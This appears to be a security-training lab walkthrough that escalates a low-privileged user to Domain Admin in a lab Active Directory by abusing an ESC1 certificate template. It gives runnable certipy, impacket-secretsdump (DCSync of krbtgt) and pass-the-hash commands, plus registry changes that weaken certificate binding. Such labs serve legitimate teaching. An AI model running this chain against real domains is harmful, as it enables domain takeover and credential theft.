# Lab 2: AD CS Abuse (ESC1) → Domain Admin

**Lab Description:** In this lab you will escalate from a single low-privileged domain user to
**full domain compromise** by abusing a misconfigured Active Directory Certificate Services
(AD CS) template (**ESC1**). You will request a certificate that impersonates a **Domain
Admin**, authenticate with it to recover that account's NTLM hash, and use the hash to
**DCSync** the domain's secrets.

**Estimated Duration:** **20 Minutes**

**Learning Objectives:** By the end of this lab, you will be able to:

- Enumerate AD CS for vulnerable certificate templates with **certipy**
- Abuse an **ESC1** template to request a certificate as another user
- Authenticate with a certificate (PKINIT) to recover an NTLM hash
- Perform a **DCSync** to dump domain credentials (incl. `krbtgt`)

**Environment / starting position:**

| Item | Value |
|---|---|
| Domain | `corp.local` (DCs `dc1` @ 10.0.1.10, `dc2` @ 10.0.1.11) |
| Enterprise CA | `corp-CA` on `adcs.corp.local` (10.0.1.40) |
| Attacker host | `kali` |
| Starting credential (low-priv user) | `amiller` / `Summer2024` |
| Target to impersonate | `adm.itadmin` (a Domain Admin) |

> The steps are in order. A **▶ host** banner tells you which machine to run each step on.
> We impersonate `adm.itadmin` (a named Domain Admin with a UPN) rather than the built-in
> `Administrator` (which has no UPN and therefore can't be mapped by certificate).

---

## ▶ DC1 — environment prep

1. Switch to the **DC1** console, elevated **PowerShell** as `CORP\azureuser`.

1. Relax strong certificate binding so a certificate authenticates cleanly, and enrol the DC's
   **Kerberos Authentication** certificate (PKINIT requires the KDC-Authentication EKU):

    ```powershell
    New-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' -Name StrongCertificateBindingEnforcement -Value 0 -PropertyType DWord -Force
    gpupdate /force ; certutil -pulse
    Get-Certificate -Template KerberosAuthentication -CertStoreLocation Cert:\LocalMachine\My
    Restart-Service kdc -Force
    ```

1. Confirm the DC now has a KDC-capable certificate:

    ```powershell
    Get-ChildItem Cert:\LocalMachine\My | ? { $_.EnhancedKeyUsageList.ObjectId -contains '1.3.6.1.5.2.3.5' } | Select Subject
    ```

    **Expected Output:** `CN=dc1.corp.local`.

---

## ▶ DC2 — environment prep (same steps)

1. Switch to the **DC2** console, elevated **PowerShell** as `CORP\azureuser`, and run the
   **same** commands:

    ```powershell
    New-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' -Name StrongCertificateBindingEnforcement -Value 0 -PropertyType DWord -Force
    gpupdate /force ; certutil -pulse
    Get-Certificate -Template KerberosAuthentication -CertStoreLocation Cert:\LocalMachine\My
    Restart-Service kdc -Force
    ```

---

## ▶ DC1 — get the target's SID

1. Back on **DC1**, get `adm.itadmin`'s SID (needed for the certificate request — modern CAs
   embed a SID that must match the target):

    ```powershell
    (Get-ADUser adm.itadmin).SID.Value
    ```

    **Expected Output:** a value like `S-1-5-21-1341600948-2356469763-1243789912-1172` —
    **copy it**, you'll paste it on Kali.

---

## ▶ Kali — the attack

1. Switch to the **Kali** host. Set the SID you copied, then enumerate AD CS (shows
   `ESC1-VulnUser` as **ESC1** and `corp-CA` as **ESC8**):

    ```bash
    SID='S-1-5-21-....-1172'      # <-- paste the real SID from DC1

    certipy-ad find -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 -vulnerable -stdout
    ```
    *(Some `RRP` / web-enrollment warnings in the output are harmless.)*

1. Abuse ESC1: request a certificate that impersonates the Domain Admin, supplying both the
   **UPN** and the **SID**:

    ```bash
    certipy-ad req -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 \
      -target adcs.corp.local -ca 'corp-CA' -template 'ESC1-VulnUser' \
      -upn 'adm.itadmin@corp.local' -sid "$SID" -out adm.itadmin
    ```

    **Expected Output:** `Successfully requested certificate` and `adm.itadmin.pfx` saved.

1. Authenticate with the certificate (PKINIT) to recover `adm.itadmin`'s **NTLM hash**:

    ```bash
    certipy-ad auth -pfx adm.itadmin.pfx -dc-ip 10.0.1.10
    ```

    **Expected Output:**

    ```output
    [*] Got TGT
    [*] Got hash for 'adm.itadmin@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
    ```

    Copy the `<NTLM_HASH>` (the part after the colon).

1. **DCSync** the domain with that hash — replicate secrets straight from the DC and dump the
   `krbtgt` account (proving full domain compromise). Replace `<NTLM_HASH>` with the real hash.

    ```bash
    impacket-secretsdump 'corp.local/adm.itadmin@10.0.1.10' -hashes ':<NTLM_HASH>' -just-dc-user krbtgt
    ```

    **Expected Output:** `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<krbtgt_hash>:::`

1. *(Optional)* Confirm Domain Admin access on the DC via pass-the-hash:

    ```bash
    netexec smb 10.0.1.10 -u adm.itadmin -H <NTLM_HASH>
    ```

    **Expected Output:** the `(Pwn3d!)` flag.

**Lab 2 Recap:** From a single low-privileged user you abused the `ESC1-VulnUser` template to
mint a certificate for the Domain Admin `adm.itadmin`, authenticated with it to recover the NT
hash, then DCSync'd the domain and dumped `krbtgt` — a complete low-priv-user → Domain-Admin →
full-domain-compromise chain.

## You have successfully completed Lab 2.

You have validated two complete attack chains against the lab.
